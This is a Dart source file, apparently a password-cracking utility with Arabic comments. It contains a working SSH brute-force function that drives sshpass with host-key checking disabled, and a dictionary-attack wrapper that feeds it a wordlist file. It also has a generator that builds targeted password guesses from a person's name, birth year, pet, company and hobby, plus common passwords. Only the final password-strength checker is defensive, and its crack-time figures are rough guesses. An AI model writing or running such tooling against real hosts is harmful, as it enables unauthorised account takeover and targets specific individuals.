import 'dart:async';
import 'dart:io';
import 'dart:convert';
import 'dart:math';

class RealPasswordCracker {
  /// هجوم القوة العمياء (Brute Force) على SSH
  static Future<Map<String, dynamic>> bruteForceSSH(
    String host, String username, List<String> passwords, {int port = 22}) async {
    
    int attempts = 0;
    for (final password in passwords) {
      attempts++;
      try {
        final result = await Process.run('sshpass', [
          '-p', password,
          'ssh', '-o', 'StrictHostKeyChecking=no',
          '-p', port.toString(),
          '$username@$host',
          'echo success'
        ], runInShell: true);

        if (result.exitCode == 0) {
          return {'success': true, 'password': password, 'attempts': attempts};
        }
      } catch (_) {}
    }

    return {'success': false, 'attempts': attempts};
  }

  /// هجوم القاموس (Dictionary Attack)
  static Future<Map<String, dynamic>> dictionaryAttack(
    String host, String username, String wordlistPath) async {
    
    try {
      final file = File(wordlistPath);
      if (!await file.exists()) return {'error': 'Wordlist file not found'};

      final passwords = await file.readAsLines();
      return await bruteForceSSH(host, username, passwords);
    } catch (e) {
      return {'error': e.toString()};
    }
  }

  /// توليد قائمة كلمات مخصصة (متقدمة)
  static List<String> generateAdvancedWordlist({
    required String firstName,
    required String lastName,
    required String birthYear,
    String? petName,
    String? company,
    String? hobby,
  }) {
    final wordlist = <String>{};
    final base = [firstName, lastName, petName, company, hobby].whereType<String>().toList();

    for (final word in base) {
      final variations = [
        word, word.toLowerCase(), word.toUpperCase(),
        '${word}123', '${word}1234', '${word}12345', '${word}123456',
        '${word}!', '${word}@', '${word}#', '${word}\$',
        '${word}@${birthYear}', '${word}_${birthYear}', '$birthYear$word',
        '${word}1', '${word}2', '${word}3',
        word.split('').reversed.join(),
      ];
      wordlist.addAll(variations);
    }

    // إضافة تواريخ
    for (int year = 1990; year <= 2026; year++) {
      wordlist.add('$firstName$year');
      wordlist.add('$lastName$year');
    }

    // إضافة كلمات شائعة
    wordlist.addAll([
      'password', 'Password', 'admin', 'Admin', 'root', 'Root',
      '123456', '12345678', '123456789', 'qwerty', 'letmein',
      'welcome', 'monkey', 'dragon', 'master', 'shadow',
    ]);

    return wordlist.where((w) => w.length >= 6).toList();
  }

  /// فحص قوة كلمة المرور (متقدم)
  static Map<String, dynamic> checkPasswordStrength(String password) {
    int score = 0;
    final feedback = <String>[];

    if (password.length >= 8) score++; else feedback.add('Password too short (min 8 chars)');
    if (password.length >= 12) score++; else feedback.add('Consider using 12+ characters');
    if (password.contains(RegExp(r'[A-Z]'))) score++; else feedback.add('Add uppercase letters');
    if (password.contains(RegExp(r'[a-z]'))) score++; else feedback.add('Add lowercase letters');
    if (password.contains(RegExp(r'[0-9]'))) score++; else feedback.add('Add numbers');
    if (password.contains(RegExp(r'[!@#\$%^&*(),.?":{}|<>]'))) score++; else feedback.add('Add special characters');
    if (!password.contains(RegExp(r'(.)\1\1'))) score++; else feedback.add('No repeating characters');

    // فحص القوائم السوداء
    final commonPasswords = ['password', '123456', 'qwerty', 'admin', 'letmein'];
    if (commonPasswords.any((p) => password.toLowerCase().contains(p))) {
      score = (score / 2).round();
      feedback.add('Contains common password pattern - AVOID');
    }

    return {
      'score': score,
      'max_score': 7,
      'strength': score >= 6 ? 'STRONG' : score >= 4 ? 'MODERATE' : 'WEAK',
      'feedback': feedback,
      'estimated_crack_time': score >= 6 ? 'Centuries' : score >= 4 ? 'Months' : 'Seconds',
    };
  }
}
